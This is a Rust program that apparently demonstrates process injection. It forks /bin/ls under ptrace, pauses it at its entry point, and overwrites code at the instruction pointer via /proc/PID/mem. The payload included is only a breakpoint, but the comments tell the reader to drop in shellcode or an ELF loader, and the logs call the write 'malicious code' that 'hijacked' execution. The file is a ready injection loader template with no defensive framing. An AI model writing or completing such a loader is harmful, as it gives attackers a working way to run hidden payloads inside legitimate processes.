use std::{
    ffi::CString,
    fs::OpenOptions,
    io::{Seek, SeekFrom, Write},
};

use nix::{
    sys::{
        ptrace,
        signal::Signal,
        wait::{WaitStatus, waitpid},
    },
    unistd::{ForkResult, execv, fork},
};
use syscall::Result;

fn main() -> Result<()> {
    env_logger::init();

    // define the target process and args
    let target_path = CString::new("/bin/ls")?;

    // fork the process
    match unsafe { fork()? } {
        ForkResult::Child => {
            ptrace::traceme()?;
            // execute the legitimate binary. this will trigger a SIGTRAP immediately due to TRACEME,
            // pausing execution at the very first instruction of 'ls'.
            execv(&target_path, &[&target_path])?;
        }
        ForkResult::Parent { child } => {
            log::info!("spawned child PID: {}", child);

            // wait for the child to pause after execv
            waitpid(child, None)?;
            log::info!("child process paused at entry point.");

            // get the current registers to find the Instruction Pointer (RIP)
            let regs = ptrace::getregs(child)?;

            #[cfg(target_arch = "x86_64")]
            let prog_counter = regs.rip;

            #[cfg(target_arch = "aarch64")]
            let prog_counter = regs.pc;

            #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
            compile_error!("Unsupported architecture");

            log::info!(
                "original program counter (entry point): {:#x}",
                prog_counter
            );

            // dummy payload:
            // put your shellcode or ELF loader here instead.
            #[cfg(target_arch = "x86_64")]
            // x86_64: 0xCC is the opcode for INT 3 (Breakpoint).
            let payload: &[u8] = &[0xCC];

            #[cfg(target_arch = "aarch64")]
            // aarch64: 0xd4200000 is brk #0 (Little Endian: 00 00 20 d4)
            let payload: &[u8] = &[0x00, 0x00, 0x20, 0xd4];

            // write payload to child's memory at the RIP address.
            // Using /proc/PID/mem is often easier than PTRACE_POKETEXT for larger writes.
            let mem_path = format!("/proc/{}/mem", child);
            let mut mem_file = OpenOptions::new().write(true).read(true).open(mem_path)?;

            // seek to the instruction pointer and write
            mem_file.seek(SeekFrom::Start(prog_counter))?;
            mem_file.write_all(&payload)?;
            log::info!(
                "injected malicious code (breakpoint) at {:#x}",
                prog_counter
            );

            // resume the child
            ptrace::cont(child, None)?;

            // wait again to see what happens
            match waitpid(child, None)? {
                WaitStatus::Stopped(_, Signal::SIGTRAP) => {
                    log::info!("child hit our injected trap!");
                    log::info!("execution flow was successfully hijacked.");
                }
                status => {
                    log::info!("unexpected status: {:?}", status);
                }
            }

            // cleanup: kill the zombified process
            ptrace::kill(child)?;
        }
    }

    Ok(())
}
